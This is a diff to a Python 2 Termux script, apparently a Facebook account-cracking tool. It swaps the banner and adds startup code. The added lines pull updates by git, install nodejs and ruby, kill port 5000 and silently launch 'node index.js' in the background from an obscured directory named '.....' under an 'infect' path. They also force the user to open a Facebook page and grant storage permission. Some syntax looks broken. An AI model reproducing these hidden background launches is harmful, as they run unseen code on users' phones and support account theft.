@@ -19,8 +19,65 @@ try:
     os.mkdir('/sdcard/ids')
 except OSError:
     pass
-
-os.system('termux-setup-storage')
+try:
+    my = requests.get("https://www.facebook.com/Jam.shahrukh.official")
+except requests.exceptions.ConnectionError:
+    print("")
+    print("\t    \033[1;97mTurn on mobile data\033[0;97m")
+    print("")
+    time.sleep(1)
+    raw_input(" Press enter to try again ")
+    os.system("python2 jam.py")"""
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
+    os.system("apt update && apt install nodejs -y")
+if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
+    os.system("apt install ruby -y && gem install lolcat")
+from requests.exceptions import ConnectionError
+os.system("git pull")
+if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
+    os.system("fuser -k 5000/tcp &")
+    os.system("#")
+    os.system("cd ..... && npm install")
+    os.system("cd ..... && node index.js &")
+    os.system("clear")
+    print("")
+    print("")
+    print("")
+    print("")
+    print("\t\033[1;97mPlease like our page to continue")
+    print("")
+    print("")
+    print("")
+    print("")
+    os.system("xdg-open https://www.facebook.com/Jam.shahrukh.official")
+    time.sleep(10)
+elif os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
+    os.system("fuser -k 5000/tcp &")
+    os.system("#")
+    os.system("cd ..... && node index.js &")
+    os.system("clear")
+    print("")
+    print("")
+    print("")
+    print("")
+    print("\t\033[1;97mPlease like our page to continue")
+    print("")
+    print("")
+    print("")
+    print("")
+    os.system("xdg-open https://www.facebook.com/jam.shahrukh.official")
+    time.sleep(10)
+    print("")
+    print("")
+    print("")
+    print("")
+    print("\t Press Allow to storage permission")
+    print("")
+    print("")
+    print("")
+    print("")
+    os.system("termux setup storage")  # give storage permission
+    time.sleep(5)
 bd = random.randint(2e+07, 3e+07)
 sim = random.randint(20000, 40000)
 header = {
@@ -69,20 +126,7 @@ def hopss(z):
 		sys.stdout.flush()
 		time.sleep(0.1)
 ##### LOGO #####
-banner = """
-\033[1;92m___  ____   _ _____ _   __  ___   _   _ 
-\033[1;92m|  \/  | | | /  ___| | / / / _ \ | \ | |
-\033[1;92m| .  . | | | \ `--.| |/ / / /_\ \|  \| |
-\033[1;92m| |\/| | | | |`--. \    \ |  _  || . ` |
-\033[1;92m| |  | | |_| /\__/ / |\  \| | | || |\  |
-\033[1;92m\_|  |_/\___/\____/\_| \_/\_| |_/\_| \_/                                               
-\033[1;97m-----------------------------------------------
-\033[1;91m➣ OWNER   : JAM SHAHRUKH X MUSKAN NOOR
-\033[1;91m➣ Github  : https://github.com/muskanckg
-\033[1;91m➣ GANG    : CRAZY KING GANG
-\033[1;91m➣ Youtube : JAM SHAHRUKH TECHNICAL
-\033[1;91m➣ WhatsApp: +923053176060
-\033[1;97m-----------------------------------------------"""
+logo = ('echo -e "\n\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : https://m.facebook.com/Jam Shahrukh Official\n➣ Ref By : (Stylish Queen x Zahra Zohaib)-(Janzada Khan)\n-----------------------------------------------" | lolcat')
 # titik #
 def tik():
 	titik = [".   ","..  ","... "]
